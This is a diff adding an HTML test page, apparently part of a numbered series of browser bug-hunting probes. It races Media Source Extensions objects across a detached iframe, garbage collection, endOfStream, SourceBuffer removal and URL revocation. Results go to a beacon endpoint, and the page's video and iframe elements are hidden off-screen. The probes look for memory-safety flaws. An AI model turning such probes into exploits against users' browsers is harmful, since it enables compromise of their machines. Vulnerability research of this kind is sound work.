@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1251</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1251-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1251: CROSS-REALM MSE + GC RACE ===');
+B('START','P1251');
+
+// Minimal valid-ish init segment (fixes from P1250: 630 bytes works)
+function buildInit(){
+  var buf=new ArrayBuffer(2048);
+  var d=new DataView(buf);
+  var pos=0;
+  function w32(v){d.setUint32(pos,v);pos+=4;}
+  function w16(v){d.setUint16(pos,v);pos+=2;}
+  function w8(v){d.setUint8(pos,v);pos+=1;}
+  function wstr(s){for(var i=0;i<s.length;i++){d.setUint8(pos,s.charCodeAt(i));pos++;}}
+  function box(type,fn){var sp=pos;w32(0);wstr(type);fn();d.setUint32(sp,pos-sp);}
+
+  box('ftyp',function(){wstr('isom');w32(0x200);wstr('isomiso2avc1mp41');});
+  box('moov',function(){
+    box('mvhd',function(){
+      w32(0);w32(0);w32(0);w32(90000);w32(0);w32(0x00010000);w16(0x0100);
+      for(var i=0;i<10;i++)w8(0);
+      w32(0x00010000);w32(0);w32(0);w32(0);w32(0x00010000);w32(0);w32(0);w32(0);w32(0x40000000);
+      for(var i=0;i<24;i++)w8(0);w32(2);
+    });
+    box('mvex',function(){
+      box('trex',function(){w32(0);w32(1);w32(1);w32(0);w32(0);w32(0);});
+    });
+    box('trak',function(){
+      box('tkhd',function(){
+        w32(3);w32(0);w32(0);w32(1);w32(0);w32(0);w32(0);w32(0);w16(0);w16(0);w16(0);w16(0);
+        w32(0x00010000);w32(0);w32(0);w32(0);w32(0x00010000);w32(0);w32(0);w32(0);w32(0x40000000);
+        w32(320<<16);w32(240<<16);
+      });
+      box('mdia',function(){
+        box('mdhd',function(){w32(0);w32(0);w32(0);w32(90000);w32(0);w16(0x55C4);w16(0);});
+        box('hdlr',function(){w32(0);w32(0);wstr('vide');w32(0);w32(0);w32(0);w8(0);});
+        box('minf',function(){
+          box('vmhd',function(){w32(1);w16(0);w16(0);w16(0);w16(0);});
+          box('dinf',function(){box('dref',function(){w32(0);w32(1);box('url ',function(){w32(1);});});});
+          box('stbl',function(){
+            box('stsd',function(){
+              w32(0);w32(1);
+              box('avc1',function(){
+                for(var i=0;i<6;i++)w8(0);w16(1);
+                for(var i=0;i<16;i++)w8(0);
+                w16(320);w16(240);w32(0x00480000);w32(0x00480000);w32(0);w16(1);
+                for(var i=0;i<32;i++)w8(0);
+                w16(0x0018);w16(0xFFFF);
+                box('avcC',function(){
+                  w8(1);w8(0x42);w8(0xC0);w8(0x1E);w8(0xFF);w8(0xE1);
+                  w16(4);w8(0x67);w8(0x42);w8(0xC0);w8(0x1E);
+                  w8(0x01);w16(4);w8(0x68);w8(0xCE);w8(0x38);w8(0x80);
+                });
+              });
+            });
+            box('stts',function(){w32(0);w32(0);});
+            box('stsc',function(){w32(0);w32(0);});
+            box('stsz',function(){w32(0);w32(0);w32(0);});
+            box('stco',function(){w32(0);w32(0);});
+          });
+        });
+      });
+    });
+  });
+  return new Uint8Array(buf.slice(0,pos));
+}
+
+var initSeg = buildInit();
+B('INIT','size='+initSeg.length);
+</script>
+
+<!-- A: CROSS-REALM MSE — Create MediaSource in iframe, detach, keep using -->
+<script>
+log('\n--- A: Cross-realm MSE ---');
+(function(){
+  var ifr = document.createElement('iframe');
+  ifr.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(ifr);
+  var idoc = ifr.contentDocument;
+  idoc.open(); idoc.write('<html><body></body></html>'); idoc.close();
+  var iwin = ifr.contentWindow;
+
+  try {
+    // Create MediaSource in iframe's realm
+    var MS = iwin.MediaSource;
+    if(!MS){B('A0','no_MS_in_iframe');return;}
+
+    var ms = new MS();
+    var vid = document.createElement('video'); // Video in MAIN frame
+    vid.muted = true;
+    vid.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+    document.body.appendChild(vid);
+
+    B('A0','ms_created_in_iframe|instanceof='+(ms instanceof MediaSource)+'|cross='+(ms instanceof MS));
+
+    ms.addEventListener('sourceopen', function(){
+      if(ms.readyState !== 'open'){B('A1','not_open');return;}
+
+      // Add SourceBuffer while iframe is still alive
+      var sb;
+      try {
+        sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+      } catch(e) {B('A1','addsb_err:'+e.message.slice(0,40));return;}
+
+      B('A1','sb_created|state='+ms.readyState);
+
+      // NOW DETACH THE IFRAME — the realm dies but MS/SB refs survive
+      document.body.removeChild(ifr);
+      ifr = null;
+      B('A2','iframe_detached');
+
+      // Check if MS/SB still work after realm death
+      try {
+        var state = ms.readyState;
+        B('A3','ms_state_after_detach='+state);
+      } catch(e) {B('A3','ms_state_err:'+e.message.slice(0,40));}
+
+      // Try appendBuffer on orphaned SourceBuffer
+      try {
+        sb.appendBuffer(initSeg);
+        B('A4','append_started_in_dead_realm');
+
+        var gotEnd = false;
+        sb.addEventListener('updateend', function(){
+          if(gotEnd) return;
+          gotEnd = true;
+          B('A5','append_ok_in_dead_realm|buf='+sb.buffered.length);
+          // Check video element state
+          try {
+            B('A6','vid_w='+vid.videoWidth+'|h='+vid.videoHeight+'|rs='+vid.readyState);
+          } catch(e) {B('A6','vid_err:'+e.message.slice(0,40));}
+        });
+        sb.addEventListener('error', function(){
+          if(gotEnd) return;
+          gotEnd = true;
+          B('A5','append_ERROR_in_dead_realm');
+        });
+      } catch(e) {
+        B('A4','append_throw:'+e.name+':'+e.message.slice(0,40));
+        // This is the interesting case — what exception? InvalidState? TypeError?
+      }
+    });
+
+    // Attach video src — this fires sourceopen
+    vid.src = URL.createObjectURL(ms);
+
+  } catch(e) {B('A','err:'+e.message.slice(0,60));}
+})();
+</script>
+
+<!-- B: MS GC race — null MediaSource ref, force GC, use SourceBuffer -->
+<script>
+log('\n--- B: MediaSource GC race ---');
+(function(){
+  var vid = document.createElement('video');
+  vid.muted = true;
+  vid.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(vid);
+
+  var sb_ref = null;
+  var ms_weak = null;
+  var ms = new MediaSource();
+
+  // Save WeakRef to MediaSource
+  if(typeof WeakRef !== 'undefined'){
+    ms_weak = new WeakRef(ms);
+  }
+
+  ms.addEventListener('sourceopen', function(){
+    if(ms.readyState !== 'open') return;
+
+    try {
+      sb_ref = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+      B('B1','sb_created');
+    } catch(e) {B('B1','err:'+e.message.slice(0,40));return;}
+
+    // Null the MediaSource reference — only video.src ObjectURL holds it
+    ms = null;
+
+    // Force GC pressure
+    var garbage = [];
+    for(var i = 0; i < 5000; i++) garbage.push(new ArrayBuffer(1024));
+    garbage = null;
+
+    // Check if MediaSource was collected
+    var ms_alive = ms_weak ? ms_weak.deref() : 'no_weakref';
+    B('B2','gc_done|ms_alive='+(ms_alive?'yes':'COLLECTED'));
+
+    // Try to use the SourceBuffer
+    try {
+      sb_ref.appendBuffer(initSeg);
+      B('B3','append_started_after_gc');
+
+      sb_ref.addEventListener('updateend', function(){
+        var ms_still = ms_weak ? ms_weak.deref() : null;
+        B('B4','append_ok|ms_alive='+(ms_still?'yes':'COLLECTED')+'|buf='+sb_ref.buffered.length);
+      });
+      sb_ref.addEventListener('error', function(){
+        B('B4','append_error_after_gc');
+      });
+    } catch(e) {
+      B('B3','append_throw:'+e.name+':'+e.message.slice(0,40));
+    }
+  });
+
+  vid.src = URL.createObjectURL(ms);
+})();
+</script>
+
+<!-- C: endOfStream race — call endOfStream then immediately append -->
+<script>
+log('\n--- C: endOfStream race ---');
+(function(){
+  var vid = document.createElement('video');
+  vid.muted = true;
+  vid.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(vid);
+
+  var ms = new MediaSource();
+  ms.addEventListener('sourceopen', function(){
+    if(ms.readyState !== 'open') return;
+    var sb;
+    try { sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"'); }
+    catch(e){B('C0','err:'+e.message.slice(0,40));return;}
+
+    // Append init, then race endOfStream vs append
+    sb.appendBuffer(initSeg);
+    sb.addEventListener('updateend', function onInit(){
+      sb.removeEventListener('updateend', onInit);
+      B('C1','init_done|state='+ms.readyState);
+
+      // Call endOfStream — transitions MS to "ended"
+      try {
+        ms.endOfStream();
+        B('C2','ended|state='+ms.readyState);
+      } catch(e){B('C2','eos_err:'+e.message.slice(0,40));return;}
+
+      // NOW try to append more data after endOfStream
+      try {
+        sb.appendBuffer(initSeg); // Should this work? On "ended" MS?
+        B('C3','append_after_eos_started');
+        sb.addEventListener('updateend', function(){
+          B('C4','append_after_eos_OK|state='+ms.readyState+'|buf='+sb.buffered.length);
+        });
+        sb.addEventListener('error', function(){
+          B('C4','append_after_eos_ERROR|state='+ms.readyState);
+        });
+      } catch(e) {
+        B('C3','append_after_eos_throw:'+e.name+':'+e.message.slice(0,30));
+        // Try reopening — some implementations allow this
+        try {
+          // vid.src = URL.createObjectURL(ms); // Re-create URL
+          // Actually, try setting duration which transitions back to "open"
+          ms.duration = 10;
+          B('C5','reopen_via_duration|state='+ms.readyState);
+          // Now try append
+          sb.appendBuffer(initSeg);
+          B('C6','append_after_reopen');
+        } catch(e2) {
+          B('C5','reopen_err:'+e2.message.slice(0,40));
+        }
+      }
+    });
+    sb.addEventListener('error', function(){
+      B('C1','init_error');
+    });
+  });
+  vid.src = URL.createObjectURL(ms);
+})();
+</script>
+
+<!-- D: SourceBuffer removal race — remove SB, then access it -->
+<script>
+log('\n--- D: SourceBuffer removal race ---');
+(function(){
+  var vid = document.createElement('video');
+  vid.muted = true;
+  vid.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(vid);
+
+  var ms = new MediaSource();
+  ms.addEventListener('sourceopen', function(){
+    if(ms.readyState !== 'open') return;
+    var sb;
+    try { sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"'); }
+    catch(e){B('D0','err:'+e.message.slice(0,40));return;}
+
+    // Append init segment
+    sb.appendBuffer(initSeg);
+    sb.addEventListener('updateend', function onInit(){
+      sb.removeEventListener('updateend', onInit);
+      B('D1','init_done');
+
+      // Remove the SourceBuffer from MediaSource
+      try {
+        ms.removeSourceBuffer(sb);
+        B('D2','sb_removed|activeCount='+ms.sourceBuffers.length);
+      } catch(e){B('D2','remove_err:'+e.message.slice(0,40));}
+
+      // Now try to USE the removed SourceBuffer
+      try {
+        var upd = sb.updating;
+        B('D3','updating='+upd); // Can we still read properties?
+      } catch(e){B('D3','read_err:'+e.name+':'+e.message.slice(0,30));}
+
+      try {
+        sb.appendBuffer(initSeg); // Append to removed SB
+        B('D4','append_to_removed_STARTED');
+      } catch(e){
+        B('D4','append_to_removed:'+e.name+':'+e.message.slice(0,30));
+      }
+
+      try {
+        var buf = sb.buffered;
+        B('D5','buffered_on_removed='+buf.length);
+      } catch(e){B('D5','buffered_err:'+e.name+':'+e.message.slice(0,30));}
+
+      // Try timestampOffset on removed SB
+      try {
+        sb.timestampOffset = 999;
+        B('D6','offset_on_removed='+sb.timestampOffset);
+      } catch(e){B('D6','offset_err:'+e.name+':'+e.message.slice(0,30));}
+
+      // Re-add a NEW SourceBuffer to the same MediaSource
+      try {
+        var sb2 = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+        B('D7','re-add_ok|count='+ms.sourceBuffers.length);
+        // Append to new SB
+        sb2.appendBuffer(initSeg);
+        sb2.addEventListener('updateend', function(){
+          B('D8','new_sb_append_ok');
+        });
+      } catch(e){B('D7','re-add_err:'+e.message.slice(0,40));}
+    });
+    sb.addEventListener('error', function(){B('D1','init_error');});
+  });
+  vid.src = URL.createObjectURL(ms);
+})();
+</script>
+
+<!-- E: URL.revokeObjectURL race — revoke URL while MS is open -->
+<script>
+log('\n--- E: revokeObjectURL race ---');
+(function(){
+  var vid = document.createElement('video');
+  vid.muted = true;
+  vid.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(vid);
+
+  var ms = new MediaSource();
+  var url = URL.createObjectURL(ms);
+
+  ms.addEventListener('sourceopen', function(){
+    if(ms.readyState !== 'open') return;
+
+    // Revoke the URL while MediaSource is open
+    URL.revokeObjectURL(url);
+    B('E1','url_revoked|state='+ms.readyState);
+
+    var sb;
+    try {
+      sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+      B('E2','sb_after_revoke|state='+ms.readyState);
+    } catch(e){B('E2','err:'+e.message.slice(0,40));return;}
+
+    // Append after URL revocation
+    try {
+      sb.appendBuffer(initSeg);
+      sb.addEventListener('updateend', function(){
+        B('E3','append_after_revoke_ok|buf='+sb.buffered.length);
+
+        // Now null the video.src
+        vid.src = '';
+        B('E4','src_cleared|ms_state='+ms.readyState);
+
+        // Try to use SB after video detach
+        try {
+          sb.appendBuffer(initSeg);
+          B('E5','append_after_detach_STARTED');
+        } catch(e){
+          B('E5','append_after_detach:'+e.name+':'+e.message.slice(0,30));
+        }
+      });
+      sb.addEventListener('error', function(){
+        B('E3','append_after_revoke_error');
+      });
+    } catch(e){B('E3','throw:'+e.message.slice(0,40));}
+  });
+
+  vid.src = url;
+})();
+</script>
+
+<!-- F: Multiple video elements sharing one MediaSource -->
+<script>
+log('\n--- F: Shared MediaSource ---');
+(function(){
+  var ms = new MediaSource();
+  var url = URL.createObjectURL(ms);
+
+  var vid1 = document.createElement('video');
+  vid1.muted = true;
+  vid1.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(vid1);
+
+  var vid2 = document.createElement('video');
+  vid2.muted = true;
+  vid2.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(vid2);
+
+  // Attach same URL to both videos
+  vid1.src = url;
+  try {
+    vid2.src = url;
+    B('F1','dual_attach_ok');
+  } catch(e){
+    B('F1','dual_attach_err:'+e.message.slice(0,40));
+  }
+
+  ms.addEventListener('sourceopen', function(){
+    B('F2','open|v1_rs='+vid1.readyState+'|v2_rs='+vid2.readyState);
+
+    try {
+      var sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+      sb.appendBuffer(initSeg);
+      sb.addEventListener('updateend', function(){
+        B('F3','append_ok|v1_w='+vid1.videoWidth+'|v2_w='+vid2.videoWidth);
+        // Remove vid1 — does vid2 keep working?
+        document.body.removeChild(vid1);
+        vid1 = null;
+        try {
+          ms.endOfStream();
+          B('F4','eos_after_remove_vid1|state='+ms.readyState);
+        } catch(e){B('F4','eos_err:'+e.message.slice(0,40));}
+      });
+    } catch(e){B('F2','err:'+e.message.slice(0,40));}
+  });
+})();
+</script>
+
+<!-- DONE beacon -->
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1251 COMPLETE ===');
+}, 8000);
+</script>
+
+</body>
+</html>
